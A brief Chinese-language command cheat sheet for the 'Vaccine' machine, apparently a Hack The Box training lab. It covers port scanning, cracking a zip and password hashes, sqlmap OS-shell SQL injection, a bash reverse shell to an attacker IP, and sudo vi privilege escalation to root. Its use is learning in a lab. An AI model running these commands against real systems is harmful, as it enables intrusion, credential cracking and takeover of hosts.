Vaccine

工具：nmap ftp john zip2john hashcat sqlmap nc ssh sudo 

关键词：sql注入 sudo提权

知识：

sudo：允许普通用户以 其他用户身份（通常是 root） 执行指定命令。

进入命令后可以调用起其他命令

其他命令利用指南：https://gtfobins.github.io/

shell：
nmap -sC -sV -T4 -p- ${target}

zip2john backup.zip > hashes #将zip转换成john破解的hash
john -wordlist=/usr/share/wordlists/rockyou.txt hashes #john破解

hashid hash #识别hash类别
hashcat -a 0 -m 0 /usr/share/wordlists/rockyou.txt # a 攻击模式 m hash类别 破解hash

sqlmap -u '${target}' --os-shell # sql注入获取shell
bash -c "bash -i >& /dev/tcp/${attackip}:${port} 0>&1" #目标机反弹shell
nc -lvnp ${port} #nc监听

ssh ${user}@${targetip} #网站配置文件中搜集相关密码

sudo -l #列出sudo配置
sudo /bin/vi /etc/postgresql/11/main/pg_hba.conf -c ':!/bin/sh'
/dev/null #运行vi后 执行bin/sh

#若无法执行 进入vi后
:set shell=/bin/shell
:shell 